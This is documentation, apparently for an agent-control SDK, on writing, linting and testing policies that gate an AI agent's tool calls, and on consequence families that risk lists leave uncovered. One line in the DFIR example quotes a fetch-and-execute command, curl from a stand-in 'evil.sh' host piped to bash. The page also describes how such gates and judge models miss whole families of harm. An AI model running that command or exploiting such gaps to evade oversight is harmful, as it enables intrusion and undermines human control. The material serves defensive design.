# Writing a policy that holds

The [admission gate](control-layer.md) is enforcement. It runs whatever
`ControlPolicy` you hand it, against whatever `Action` you hand it — and it
cannot know that the action you *didn't* classify as risky is the one that
moves money.

So the gate is sound and the policy is the soft part. This page covers the
policy as the people who own it work with it: a document they review,
version, lint and reload, and then the failure mode no document check finds,
and how to look for it before production does.

## The policy as a file

A policy is a short list of rules, and the team that owns the rules is
usually not the team that owns the Python. So the first form of a
`ControlPolicy` is a file. This is the one [notebook 71](../notebooks/notebook_71_payment_refund_gate.md)
loads:

```yaml
schema: "locus.control.policy/v1"
require_verification_score: 0.0
max_blast_radius: 1
require_human_for:
  - "high_value"
deny_for: []
min_severity: "low"
require_sandbox_for: []
version: "refund-gate-1"
require_human_over_usd: null
spend_limit_usd: null
```

Every key is a `ControlPolicy` field, with the field's name, type and
default, so the file can say exactly what the Python API can say and
nothing else:

| Key | Type | What it does |
|---|---|---|
| `require_verification_score` | number | the verification confidence an action needs to run on its own; `0.0` for a gate over business actions, which arrive without a `VerificationResult` |
| `max_blast_radius` | integer | the most assets an action may touch and still run on its own |
| `require_human_for` | list of labels | an action carrying one of these waits for a person |
| `deny_for` | list of labels | an action carrying one of these is refused; no approval overrides it |
| `min_severity` | `info` … `critical` | a finding below this band is not acted on |
| `require_sandbox_for` | list of labels | an action carrying one of these runs only with the `sandboxed` tag |
| `version` | string | a label for this revision, bound into approval ids |
| `require_human_over_usd` | number or `null` | an action costing more waits for a person |
| `spend_limit_usd` | number or `null` | an action that would take its scope past this is refused |

A label is anything `Action.labels()` returns: the environment, the kind,
and every tag. Omitted keys take the Python defaults. The same document in
JSON is accepted anywhere YAML is; reading YAML needs the optional `pyyaml`
package (`pip install pyyaml`), JSON and writing need nothing.

```python
from locus.control import ControlPolicy

policy = ControlPolicy.load("policy/refunds.yaml")
```

A key the policy does not have is an error that names it, with the path,
so a typo cannot quietly widen authority:

```text
refunds.yaml: at max_blast_radious: unknown key 'max_blast_radious' (did you mean 'max_blast_radius'?)
refunds.yaml: at require_human_for[1]: expected a non-empty string, got a number
```

## The same policy in Python

The file and the constructor are two spellings of one object. Build it in
code when the rules are computed, and write it out for review with
`dump()`; load it back and you have an equal policy that decides every
action the same way.

```python
from locus.control import ControlPolicy

policy = ControlPolicy(
    require_verification_score=0.0,
    max_blast_radius=1,
    require_human_for=frozenset({"high_value"}),
    version="refund-gate-1",
)
print(policy.dump())  # the YAML above
policy.dump("policy/refunds.json")  # or JSON, from the suffix

assert ControlPolicy.load(policy.dump()) == policy
```

`policy.content_hash()` is the SHA-256 of the rules, the same whether the
policy came from YAML, JSON or the constructor, and different for any
change to any rule. `admit()` records it as `policy_hash` on every audit
entry, so an auditor reading a trail knows exactly which rules each
decision was made under, and a trail written before this field existed
still verifies.

## Reload without a deploy

`PolicyWatcher` follows the file. It reads it once at startup, so a broken
file fails before the agent serves anything, and after that re-reads it
when its modification time changes, checking at most once per `interval`.
Hand it anywhere a policy goes:

```python
from locus.control import PolicyWatcher, gate_tool

watcher = PolicyWatcher("policy/refunds.yaml", interval=2.0)
refund = gate_tool(issue_refund, policy=watcher, trail=trail)
```

Each admission asks the watcher once, so a decision is made under one
policy from start to finish and the next decision sees the new one whole.
A rewrite that no longer parses does not change the policy in force: the
last good one stays, `watcher.last_error` says why, and the next change to
the file is tried again. Pass `on_reload=` to log a swap or refuse to run
under rules you did not expect.

## Lint it

A policy can be well-formed and still have a hole a reader does not see.
`locus policy lint` reports three kinds:

- **`unreachable-rule`**: a rule that can never decide an outcome. A label
  in `require_human_for` that `deny_for` also names, a per-action cost hold
  at or above the spend limit that denies first, a verification bar above
  `1.0`.
- **`uncovered-environment`**: a declared environment in which an ordinary
  action (one asset, no cost, no other label) clears the gate on its own.
- **`kind-never-held`**: a declared kind of action that is never put in
  front of a person in any declared environment.

The last two need to know what the deployment has. Declare it in the file,
or pass it on the command line:

```yaml
governs:
  environments: ["production", "staging"]
  kinds: ["payment"]
```

```console
$ locus policy lint policy/refunds.yaml --environments production staging --kinds payment
policy policy/refunds.yaml (sha256 b5afd3d6f5af)
3 finding(s):
  uncovered-environment: environment 'production' has no rule: an action there with one asset, no cost and no other label is allowed without a person
  uncovered-environment: environment 'staging' has no rule: an action there with one asset, no cost and no other label is allowed without a person
  kind-never-held: kind 'payment' is never held: a payment action with one asset, no cost and no other label is allowed in every declared environment ['production', 'staging']
note: an action with no environment, kind or tags, one asset and no cost is allowed: every gated tool must derive labels for this policy to see it
```

Those three are true of the refund policy above: it holds on `high_value`
and on blast radius, not on where or what. Whether that is a gap or the
design is the reviewer's call; the point is that the question is asked.
Coverage is found by weighing a probe action with `approve()` itself, so
lint cannot disagree with the gate about what passes. The exit code is 1
when there is a finding and `--format json` is for a job to read.

### In CI

Lint the policy on every change to it, next to the tests:

```yaml
# .github/workflows/policy.yml
name: policy
on:
  pull_request:
    paths: ["policy/**"]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install locus-sdk pyyaml
      - run: locus policy lint policy/refunds.yaml --environments production staging --kinds payment
      - run: >
          locus policy explain policy/refunds.yaml --expect require_human
          --action '{"name": "issue_refund", "kind": "payment", "environment": "production", "blast_radius": 6}'
```

The second step is a regression test for one decision: `--expect` exits 1
unless the outcome is the one named, so a change that lets a batch refund
through fails the build with the decision path in the log.

### Explain one action

`locus policy explain` shows every rule, fired or not, with the outcome
and what it means for the caller:

```console
$ locus policy explain policy/refunds.yaml \
    --action '{"name": "issue_refund", "kind": "payment", "environment": "production", "blast_radius": 6, "tags": ["high_value"]}'
policy   policy/refunds.yaml (sha256 b5afd3d6f5af) version refund-gate-1
action   issue_refund environment=production kind=payment blast_radius=6 cost_usd=0.00 tags=['high_value']
labels   ['high_value', 'payment', 'production']

  deny_for                    -              no label of the action is denied
  require_sandbox_for         -              no label of the action requires a sandbox
  min_severity                -              no finding supplied
  require_verification_score  -              the bar is 0: no verification required
  max_blast_radius            require_human  blast radius 6 exceeds the maximum 1
  require_human_over_usd      -              not set
  spend_limit_usd             -              not set
  require_human_for           require_human  labels ['high_value'] require human approval

outcome  require_human: held for a person; runs once someone approves (admit(..., approved_by=...))
```

`--spent-usd` and `--verification` supply what the gate would read from a
spend ledger and a `VerificationResult`. From Python, `explain(policy,
action)` returns the same path as data, and `lint_policy(policy,
environments=..., kinds=...)` the same findings.

## The failure mode: one family of harm at a time

A risk list is written by a person, and a person writes down the harm they
were thinking about. The list comes out internally consistent, passes review,
passes its tests — and says nothing at all about a kind of consequence that
never came to mind.

Three real examples, all from admission gates written for real tool catalogs,
all validated against those catalogs before the gap was found:

| Gate over | The list covered | It was silent on |
|---|---|---|
| A payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |
| A DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** — running a command on a host, uploading a file off it |
| A billing API | **money movement** | **outbound communication** — messaging a customer, scheduling recurring messages |

In each case every entry on the list was correct. In each case the list was a
single semantic family — reversal verbs, destruction verbs, money-movement
verbs — and everything outside that family was classified low-risk and
executed.

The second one is worth sitting with. A gate that held
`Windows.Remediation.Quarantine` let
`SELECT * FROM execve(argv=["bash","-c","curl http://evil.sh | bash"])`
through as a benign read, because no destruction verb appears anywhere in it.

## Why validating against the real catalog does not catch this

The obvious defence is to run your classifier over every tool the target
actually exposes and hand-check the results. Do that — it finds real bugs.

It will not find this one. You score the catalog against a ground truth you
also wrote, from the same mental model that produced the risk list. The
labels agree with the classifier because both encode the same idea of harm.
A 62-case dataset scoring 62/62 is evidence that your classifier matches your
labels, not that your labels cover the harm.

!!! warning "A ground-truth set built from one framing can only find bugs inside that framing."

    The payments example above scored 62/62 on a live-pulled catalog, twice,
    across six rounds of hardening — while creating a charge was low-risk the
    whole time. The dataset's labelling rule scoped risk to money moving
    *out*, so no charge-initiating operation was ever a case in it.

## Check the families, not the list

Rather than re-reading your list, enumerate the ways an action can be
consequential and ask, for each, *which entry covers this?* An empty answer is
the finding.

| Family | The action… | Typical markers |
|---|---|---|
| **Destruction** | removes or overwrites something | delete, wipe, purge, revoke, uninstall |
| **Value out** | moves money or assets away | refund, payout, transfer, chargeback |
| **Value in** | takes payment, or stands up a surface that can | charge, capture, checkout session, payment link, QR code |
| **Execution** | runs caller-supplied code somewhere | exec, shell, script, run, deploy |
| **Egress** | moves data off a system | upload, export, http client, copy, forward |
| **Outbound communication** | reaches a real third party | send, notify, publish, invite, remind |
| **Standing commitment** | schedules future automatic behaviour | subscribe, recurring, auto-\*, cron, retention rule |
| **Identity & access** | changes who can do what | grant, disable user, rotate, add member |
| **Config with blast radius** | changes behaviour for everyone | feature flag, quota, routing rule, webhook target |

The list is a prompt for thought, not a schema. Add rows for your domain — the
point is having *some* enumeration you check against, so a whole family cannot
go missing silently.

For each family, three questions:

1. **Which entry covers it?** No entry means the family is unhandled.
2. **Is there a second path to the same outcome?** An unheld alternative route
   is worth more to an attacker than the route you held. Holding "send the
   invoice" while leaving "generate a scannable payment code for that invoice"
   open holds nothing.
3. **Does the caller control the dangerous part?** A tool that shells out
   internally to read disk usage is a read. A tool that runs a command the
   caller supplies is not, however similar the names look.

## Match on what the caller actually sends

Question 3 has a practical consequence worth stating on its own, because it
decides whether a marker is safe to add at all.

Classify the text the caller submitted, not the implementation behind it. In
one real catalog, 41 artifacts call `execve` inside their own definitions to
collect read-only data — running `df`, running `rpm -qa`. Flagging every tool
that executes *something* would have held all 41 and made the gate unusable.
Matching the submitted request instead means `execve` appears only when the
caller wrote it, which made it both a precise marker and a zero-false-positive
one.

The same reasoning cuts the other way for near-miss names. A marker of
`shell` would flag `Windows.Forensics.Shellbags`, a read-only forensic
artifact. Qualify markers until they name the consequential thing and nothing
else — and where you cannot, prefer the false positive:

!!! tip "Judge a gate by what it lets through, not by what it stops."

    Over-caution costs a confirmation prompt. A miss costs the thing you
    built the gate for. When a marker cannot be tightened without opening a
    real path, leave it broad and write the resulting false positives down
    where the next reader will find them.

## Write the exclusions down

Every classifier has entries it flags that are harmless, and boundaries it
decided not to defend. Those are findings, not embarrassments — an
undocumented exclusion is indistinguishable from an oversight the next time
someone reads the policy.

Say, in the policy module itself:

- which safe things it flags anyway, and why tightening would open a real gap;
- which families it deliberately does not cover;
- which controls it structurally cannot express.

That last one matters more than it looks. Two of the first controls anyone
asks for — *"at most $500 of refunds per day"* and *"five of these per
hour"* — land on opposite sides of the line. Cumulative spend is expressible:
`ControlPolicy(require_verification_score=0, spend_limit_usd=500, require_human_over_usd=100)`
plus a `SpendLedger` (`FileSpendLedger` for one that survives a restart)
holds any single action over $100 for a person and denies one that would take
its scope past $500, and that deny is hard: no approval overrides it.
(`require_verification_score=0` because the default bar holds every call that
arrives without a verdict; see the note below.) Wire it with
`gate_tool(..., action=..., ledger=ledger, spend_scope=...)`. `action` must
set `Action.cost_usd` from the call's arguments, for example
`lambda name, args: Action(name=name, cost_usd=args["amount_usd"])`. The
default action costs nothing, so without it neither dollar rule ever fires and
the ledger stays empty. `spend_scope` may be a callable, so *per day* means
putting the date in the scope key; neither shipped ledger ever expires an
entry. Spend is read before the call and recorded after it, not in one
transaction, so two calls in flight against the same scope can both pass. That
includes parallel tool calls from one agent turn, which run concurrently by
default. Keep one call in flight per scope (for example
`tool_execution="sequential"` on the agent, and one process per scope). A
ledger cannot close the gap by itself: the gate asks it for the total before
the call and reports the cost only after, so it never sees the pending amount.
A rate limit is not expressible:
`ControlPolicy` has no count-per-window rule, so *"five of these per hour"*
still needs state you keep yourself. Naming the boundary is engineering
judgment; letting a reader discover it is not.

## Guidance for the judge

The families above are the deterministic half: a classifier maps a call to
labels, and the policy holds or denies on labels. `ToolCallJudge` is an
optional second half for what labels cannot carry, the *arguments*. A refund
to the payment method on the order and a refund to an account that appears
nowhere else carry the same `value_out` label.

The judge reads two things you write:

- `intent`: the policy in plain words. One paragraph: what the agent is for
  and what it must never do. The judge weighs every call against it.
- `guidance`: per tool, the line the judge reads when that tool is proposed.
  Write it the way you would brief a reviewer: the condition, and the verdict
  it should produce.

```python
from locus.control import ToolCallJudge

judge = ToolCallJudge(
    small_model,
    intent=(
        "A support agent for one customer's own orders. It may refund the order's "
        "own payment method. It never moves money to a destination not on the order."
    ),
    guidance={
        "issue_refund": (
            "Hold anything over 500 USD. Deny a destination account that is not "
            "the order's payment method."
        ),
        "send_message": "Hold a message that mentions a password, a reset link or a payment code.",
    },
    budget=20,
)
```

Three habits:

1. **Say what to hold, not only what to deny.** A hold costs a human review; a
   deny is final. Reserve deny for the call that must never run, and hold for
   the one a person should see first.
2. **Keep a rule a rule.** If "over 500 USD" can be a `derive` rule or an
   `Action.cost_usd` threshold, write it there: the policy does not have a bad
   day. Give the judge only what you cannot write as a rule.
3. **Mark the read-only tools.** `@tool(read_only=True)` skips the judge for a
   lookup. A judge that spends its `budget` on reads has nothing left for the
   write that mattered, and once the budget is spent every further call is
   held.

The guidance is text a model reads, so test it the way you test the policy:
one scripted call per family with `locus.testing.ScriptedModel` standing in
for the judge, asserting the fold into the decision rather than the model's
judgement, and then a live run of the judge model over the same calls before
relying on it. The fold itself is fixed: whatever the judge says, a policy
hold or deny stands.

## A worked check

```python
from locus.control import Action, ControlPolicy, approve

# One representative call per consequence family; adding a family is cheap.
FAMILY_PROBES = {
    "destruction": Action(name="delete_record", environment="production"),
    "value_out": Action(name="issue_refund", environment="production"),
    "value_in": Action(name="create_charge", environment="production"),
    "execution": Action(name="run_script", environment="production"),
    "egress": Action(name="export_customers", environment="production"),
    "outbound_comms": Action(name="send_invoice", environment="production"),
    "standing_commitment": Action(name="enable_auto_reminders", environment="production"),
    "identity_access": Action(name="disable_user", environment="production"),
}


def uncovered(policy: ControlPolicy, classify, benign: Action) -> list[str]:
    """Families whose probe would be auto-allowed; `classify` maps a call to an `Action`."""
    if not approve(classify(benign.name, {}), policy=policy).allowed:
        raise AssertionError(
            f"{benign.name!r} was held, so this policy holds everything and "
            "the probe below cannot distinguish a covered family from an "
            "uncovered one. Fix the policy or pick a benign probe first."
        )
    return [
        family
        for family, probe in FAMILY_PROBES.items()
        if approve(classify(probe.name, {}), policy=policy).allowed
    ]
```

Against a classifier that matches reversal verbs only — the first failure in
the table above — this returns everything except `destruction` and
`value_out`:

```text
['value_in', 'execution', 'egress', 'outbound_comms',
 'standing_commitment', 'identity_access']
```

Six families, from a two-marker list that its author would have described as
covering "the dangerous operations".

Run it in your test suite, not once by hand. A family that is genuinely out of
scope belongs in an explicit allowlist with a reason next to it — which is the
same discipline as writing the exclusions down, enforced by CI.

!!! note "Why the benign probe is not optional"

    `ControlPolicy()`'s defaults require a verification score of 0.8, so with
    no `VerificationResult` supplied every action is held for a human. Sound
    for a findings-driven security agent; for a tool-gating deployment it
    means the probe above returns `[]` no matter how incomplete your
    classifier is. The guard turns that silent pass into a loud failure.

## The short version

- The gate enforces; your classification decides what it enforces on.
- Re-reading your risk list confirms the list. It cannot reveal the family
  that was never on it.
- A ground-truth dataset inherits the framing of whoever labelled it.
- Enumerate consequence families and check coverage per family.
- Look for second paths to a held outcome.
- Classify what the caller sent, not what the implementation does.
- Prefer the false positive, and write every exclusion down.

## See also

- [The control layer](control-layer.md) — how `admit()` and `approve()` fit together
- [A second check that reads the call](control-layer.md#a-second-check-that-reads-the-call) — what the judge adds, and where it stops
- [GSAR grounding](gsar.md) — the same "prove it, don't assert it" discipline applied to claims
